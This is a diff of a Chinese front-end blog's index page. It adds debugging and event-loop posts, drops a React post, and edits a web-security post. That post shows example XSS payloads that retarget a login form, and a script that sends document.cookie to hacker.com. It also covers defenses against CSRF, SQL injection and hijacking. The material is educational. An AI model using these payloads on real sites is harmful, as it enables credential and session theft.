@@ -259,6 +259,271 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/test/fiddler.html">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="YooHannah">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/psb.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="My Little World">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/post/test/fiddler.html" itemprop="url">
+                  调试
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T22:47:15+08:00">
+                2018-01-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="fiddler-使用"><a href="#fiddler-使用" class="headerlink" title="fiddler 使用"></a>fiddler 使用</h1><p>浏览器向服务器发送请求的拦截器</p>
+<h2 id="statistic"><a href="#statistic" class="headerlink" title="statistic"></a>statistic</h2><p>查看一次请求各阶段所发生的时间，HTTP performance<br><img src="/image/fiddler5.png" alt="fiddler5"></p>
+<h1 id="Inspectors"><a href="#Inspectors" class="headerlink" title="Inspectors"></a>Inspectors</h1><p>查看报文，上半部分是request,下半部分是response<br><img src="/image/fiddler4.png" alt="fiddler4"></p>
+<h2 id="AutoResponder"><a href="#AutoResponder" class="headerlink" title="AutoResponder"></a>AutoResponder</h2><p>拦截本来要发给真正服务器的指定请求,将本地资源作为response返回去<br><img src="/image/fiddler3.png" alt="fiddler3"><br>1.开启规则<br>2.添加规则<br>3.指定请求，若以EXACT：开头，要写完整的请求路径;模糊匹配的话就不要写EXACT：<br>4.指定作为response的本地路径资源地址<br>5.确认规则配置完毕</p>
+<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>自己创建request 向服务器发送请求<br><img src="/image/fiddler2.png" alt="fiddler2"><br>配置好request后，点击excute按钮手动向服务器发送请求</p>
+<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>只拦截指定的请求,其他请求不拦截，指定多个时用逗号隔开<br><img src="/image/fiddler1.png" alt="fiddler1"><br>填写指定请求时，编辑框为黄色，为未保存状态，点击右上角‘Changes not yet saved’确认配置完毕</p>
+<h1 id="谷歌浏览器调试常用"><a href="#谷歌浏览器调试常用" class="headerlink" title="谷歌浏览器调试常用"></a>谷歌浏览器调试常用</h1><h2 id="将respose进行json格式转换"><a href="#将respose进行json格式转换" class="headerlink" title="将respose进行json格式转换"></a>将respose进行json格式转换</h2><p>1.右键接口选择copy-&gt;copy response;<br>2.在console界面执行copy()函数<br>copy(   ctrl+v    )   回车<br>3.打开编辑器，新建一个文件，ctrl+v,就得到response 的json格式<br><img src="/image/debug1.gif" alt="debug1"></p>
+<h2 id="console使用"><a href="#console使用" class="headerlink" title="console使用"></a>console使用</h2><ol>
+<li><p>console.table(obj):将json数据以表格形式展示在控制台<br>例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var animals = [</div><div class="line">    &#123; animal: &apos;Horse&apos;, name: &apos;Henry&apos;, age: 43 &#125;,</div><div class="line">    &#123; animal: &apos;Dog&apos;, name: &apos;Fred&apos;, age: 13 &#125;,</div><div class="line">    &#123; animal: &apos;Cat&apos;, name: &apos;Frodo&apos;, age: 18 &#125;</div><div class="line">];</div><div class="line"></div><div class="line">console.table(animals);</div></pre></td></tr></table></figure>
+</li>
+<li><p>使用 console.time() 和 console.timeEnd() 对循环做基准测试<br>例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">console.time(&apos;Timer1&apos;);</div><div class="line"></div><div class="line">var items = [];</div><div class="line"></div><div class="line">for(var i = 0; i &lt; 100000; i++)&#123;</div><div class="line">   items.push(&#123;index: i&#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">console.timeEnd(&apos;Timer1&apos;);</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>最后会得到循环所用时间<br>Timer1：xxxxx ms</p>
+<ol>
+<li>使用console.trace 跟踪调用栈<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">var car;</div><div class="line">var func1 = function() &#123;</div><div class="line">	func2();</div><div class="line">&#125;</div><div class="line"></div><div class="line">var func2 = function() &#123;</div><div class="line">	func4();</div><div class="line">&#125;</div><div class="line">var func3 = function() &#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var func4 = function() &#123;</div><div class="line">	car = new Car();</div><div class="line">	car.funcX();</div><div class="line">&#125;</div><div class="line">var Car = function() &#123;</div><div class="line">	this.brand = &apos;volvo&apos;;</div><div class="line">	this.color = &apos;red&apos;;</div><div class="line">	this.funcX = function() &#123;</div><div class="line">		this.funcY();</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	this.funcY = function() &#123;</div><div class="line">		this.funcZ();</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	this.funcZ = function() &#123;</div><div class="line">		console.trace(&apos;trace car&apos;)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">func1();</div><div class="line">结果如下：</div><div class="line">trace car</div><div class="line">Car.funcZ @ VM524:28</div><div class="line">Car.funcY @ VM524:24</div><div class="line">Car.funcX @ VM524:20</div><div class="line">func4 @ VM524:14</div><div class="line">func2 @ VM524:7</div><div class="line">func1 @ VM524:3</div><div class="line">(anonymous) @ VM524:31</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="调试js"><a href="#调试js" class="headerlink" title="调试js"></a>调试js</h2><p>在当前页面的js里面修改或添加代码后，ctrl+s 然后在页面触发更改的代码，即可进行调试<br>但要注意需要刷新才能执行到的代码，不能用这种方式进行调试</p>
+<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>直接在代码序号上进行点击即添加了断点<br>取消断点就再点击断点<br>退出断点调试就点右上角<br><img src="/image/debug2.png" alt="debug2"><br>禁用断点<br><img src="/image/debug3.png" alt="debug3"><br>如果想知道当前断点上的变量值，只需要将鼠标放在变量上即可<br><a href="https://www.zybuluo.com/lxjwlt/note/434612" target="_blank" rel="external">相关链接</a><br><a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="external">相关链接</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/eventloop.html">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="YooHannah">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/psb.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="My Little World">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/post/js/eventloop.html" itemprop="url">
+                  关于事件循环event-loop
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-01T21:47:15+08:00">
+                2018-01-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h1><p>同一时间只干一件事，干完一件事再干下一件事，<br>如果前一个任务耗时很长，后一个任务也得一直等着</p>
+<p>为什么这样设计？<br>js 要指挥浏览器干活，如果有两个线程同时执行任务，一个删除DOM，一个修改该DOM，浏览器会不知道以哪个线程为准</p>
+<h1 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h1><p>同步任务，在主线程上排队执行的任务，前一个执行完才能执行后一个任务<br>异步任务，一开始不进入主线程，而进入‘任务队列’被挂起，只有‘任务队列’通知主线程某个异步任务可以执行了，该任务才会进入主线程<br>或者主线程上没有要执行的任务了，就会去任务队列拿任务 ，在确认该到达规定时间后，就给到主线程进行执行其对应的回调函数</p>
+<h1 id="event-Loop"><a href="#event-Loop" class="headerlink" title="event Loop"></a>event Loop</h1><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）<br>setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，即尽可能早得执行<br>另外如果主线程的栈中当前代码耗时很长，要等很久，按照先主线程，再任务队列的执行顺序，<br>就没办法保证setTimeout的回调函数fn能够在指定的时间执行</p>
+<h1 id="node-js-event-loop"><a href="#node-js-event-loop" class="headerlink" title="node.js event loop"></a>node.js event loop</h1><p>nodejs 运行机制：<br> (1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p>
+<p>与任务队列相关方法<br>process.nextTick:在主线程任务全部结束后，读取任务队列的任务之前执行它所指定的函数，<br>如果指定函数里还套嵌process.nextTick方法，或者有多个process.nextTick方法，都要在本轮读取任务队列前执行完<br>setImmediate：它指定的任务总是在下一次的eventloop时执行，<br>如果setImmediate与setTimeout(fn,0)各自添加了一个回调函数，那么在下一loop时，他们回调函数的顺序是不确定<br>如果setImmediate套嵌setImmediate方法,则套嵌的回调函数会被注册到下一轮事件循环中再执行</p>
+<p>即多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>
+<p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="external">相关链接</a></p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>task/macrotask:script（整体代码）, setTimeout, setInterval, setImmediate, I/O, UI rendering<br>micotask:process.nextTick, Promises（这里指浏览器实现的原生 Promise）, Object.observe, MutationObserver<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">process.nextTick(() =&gt; &#123;</div><div class="line">  console.log(&apos;nextTick&apos;)</div><div class="line">&#125;)</div><div class="line">Promise.resolve()</div><div class="line">  .then(() =&gt; &#123;</div><div class="line">    console.log(&apos;then&apos;)</div><div class="line">  &#125;)</div><div class="line">setImmediate(() =&gt; &#123;</div><div class="line">  console.log(&apos;setImmediate&apos;)</div><div class="line">&#125;)</div><div class="line">console.log(&apos;end&apos;)</div><div class="line"></div><div class="line">//结果</div><div class="line">end</div><div class="line">nextTick</div><div class="line">then</div><div class="line">setImmediate</div></pre></td></tr></table></figure></p>
+<p>micro-task在ES2015规范中称为Job,<br>promise.then的执行其实是向PromiseJobs添加Job</p>
+<p>在eventloop中，一个task执行完会检查micotask队列，如果有，则先执行micotask，然后再去异步队列领取任务<br><a href="https://github.com/creeperyang/blog/issues/21" target="_blank" rel="external">相关</a><br><a href="https://segmentfault.com/a/1190000010913949" target="_blank" rel="external">相关</a><br><a href="https://www.cnblogs.com/dong-xu/p/7000139.html" target="_blank" rel="external">相关</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/session&cookie.html">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -589,11 +854,14 @@
           
             <h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
 <h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</div><div class="line">//但如果在访问的同时注入攻击代码，如下</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</div><div class="line">//页面代码就会变成</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</div><div class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</div><div class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</div><div class="line"></div><div class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</div><div class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</div><div class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</div><div class="line">document.write(content);</div><div class="line">document.write(&apos;&gt;&apos;);</div><div class="line">//本次代码注入的方式变为访问</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</div><div class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</div><div class="line"></div><div class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</div><div class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</div><div class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</div></pre></td></tr></table></figure></p>
-<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;</p>
-<p>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;<br>使用x-xss-protection报头<br>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
 <h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
 <p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">相关链接</a></p>
-<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数</p>
+<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数<br>3.使用strict-transport-security报头</p>
+<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><p>前端提交的数据未经校验处理直接存到数据库，然后从数据库中读取直接插入到页面中<br>1.如果提交的数据本来含有可解析的代码，从数据库读取后在插入过程中可造成XSS攻击<br>2.如果提交的数据含有SQL查询语句，且被直接拼接到SQL语句中被执行，可能会导致执行结果与预期不同的现象</p>
+<h2 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h2><p>对前端提交的数据进行严格校验</p>
+<h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><p>表现就是DNS服务器上解析表被篡改，导致将正常访问的域名指向篡改后的域名</p>
+<h1 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h1><p>数据包被修改或插入，导致页面出现弹窗广告<br>解决办法就是使用HTTPS<br>使用upgrade-insecure-request报头请求升级HTTPS<br>使用content-security-policy报头响应升级HTTPS</p>
 
           
         
@@ -1308,363 +1576,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/react/react.html">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="YooHannah">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/psb.jpg">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="My Little World">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/post/react/react.html" itemprop="url">
-                  react 简略学习笔记
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-09T06:37:02+08:00">
-                2017-10-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>react.js是一个UI库,按照react规则，可以组建页面里每一小块的功能，这种局部的功能就是一个组件，<br>各组件之间可以组合、嵌套，从而拼成整个页面<br>react就是在组建各个尽可能通用的组件</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接使用官方工具 create-react-app<br>npm install -g create-react-app 安装命令行<br>create-react-app hello-react 构建工程<br>cd hello-react 进入工程<br>npm start 运行<br>src/App.js 即是编写组件的文件<br>一个简单的组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">import React, &#123; Component &#125; from &apos;react&apos; //写组件必须要引入的依赖</div><div class="line">import ReactDOM from &apos;react-dom&apos; //把组件渲染到页面上去，就是把组件的html结构形成页面</div><div class="line">import &apos;./index.css&apos;</div><div class="line"></div><div class="line">class Header extends Component &#123;</div><div class="line">  render () &#123; //组件必须要有的函数，且必须要返回JSX</div><div class="line">    return ( //返回JSX写的组件内容</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;h1&gt;React 小书&lt;/h1&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//ReactDOM.render 功能就是把组件渲染并且构造 DOM 树，然后插入到页面上某个特定的元素上（在这里是 id 为 root 的 div 元素）。</div><div class="line"></div><div class="line">ReactDOM.render(</div><div class="line">  &lt;Header /&gt;,</div><div class="line">  document.getElementById(&apos;root&apos;)</div><div class="line">)</div></pre></td></tr></table></figure></p>
-<p>在编写 React.js 组件的时候，一般都需要继承 React.js 的 Component（也有别的编写组件的方式–&gt;函数式组件）。一个组件类必须要实现一个 render 方法，这个 render 方法必须要返回一个 JSX 元素。但这里要注意的是，</p>
-<p>必须要用一个外层的 JSX 元素把所有内容包裹起来。返回并列多个 JSX 元素是不允许的，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//不对的</div><div class="line">return (</div><div class="line">      &lt;div&gt;第一个&lt;/div&gt;</div><div class="line">      &lt;div&gt;第二个&lt;/div&gt;</div><div class="line">        )</div><div class="line">//对的</div><div class="line">return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;div&gt;第一个&lt;/div&gt;</div><div class="line">      &lt;div&gt;第二个&lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  )</div></pre></td></tr></table></figure></p>
-<h1 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h1><p>可以把它看做是js的一种数据类型，长得很像HTML，但不是HTML,可以像html那样写，但有些地方要注意</p>
-<p>可应用{}插入任何js代码，<br>如果是表达式函数，则返回的结果会相应地渲染到页面上，变量则将变量值对应渲染</p>
-<p>{}内如果是条件表达式，即可以实现，根据不同条件返回不同jsx内容，<br>如果在表达式插入里面返回 null ，那么 React.js 会什么都不显示，相当于忽略了该表达式插入。结合条件返回的话，就做到显示或者隐藏某些元素</p>
-<p>可以做变量的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">render () &#123;</div><div class="line">  const isGoodWord = true</div><div class="line">  const goodWord = &lt;strong&gt; is good&lt;/strong&gt;</div><div class="line">  const badWord = &lt;span&gt; is not good&lt;/span&gt;</div><div class="line">  const title = &lt;h1 className=&apos;title&apos;&gt; ScriptOJ &lt;/h1&gt;</div><div class="line">  const page = &lt;div className= &apos;content&apos;&gt; &#123;title&#125; &lt;/div&gt; //page里面用title的值，即 &lt;h1 className=&apos;title&apos;&gt; ScriptOJ &lt;/h1&gt;</div><div class="line">  return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;h1&gt;</div><div class="line">        React 小书</div><div class="line">        &#123;isGoodWord ? goodWord : badWord&#125;</div><div class="line">      &lt;/h1&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  )</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>给标签添加class时，不能用class,要用className<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">render () &#123;</div><div class="line">  const className = &apos;header&apos;</div><div class="line">  return (</div><div class="line">    &lt;div className=&#123;className&#125;&gt;</div><div class="line">      &lt;h1&gt;React 小书&lt;/h1&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  )</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>for属性不能用，要用htmlfor代替，<br>其他的 HTML 属性例如 style 、data-* 等就可以像普通的 HTML 属性那样直接添加上去。</p>
-<h1 id="组件树"><a href="#组件树" class="headerlink" title="组件树"></a>组件树</h1><p>通过继承Component可以自定义形成多个类,即形成多个组件，但这些组件名，<br>或者说类名要作为标签使用，为与普通小写字母开头的HTML标签做区分，一定要以大写字母开头</p>
-<p>自定义组件以标签的形式放入另一个自定义组件的JSX中，即可实现包含关系<br>多个自定义标签组件并列放入同一个JSX中即实现并列关系<br>组件可以和组件组合在一起，组件内部可以使用别的组件，就像普通的 HTML 标签一样使用就可以<br>这样的组合嵌套，最后构成一个所谓的组件树</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td 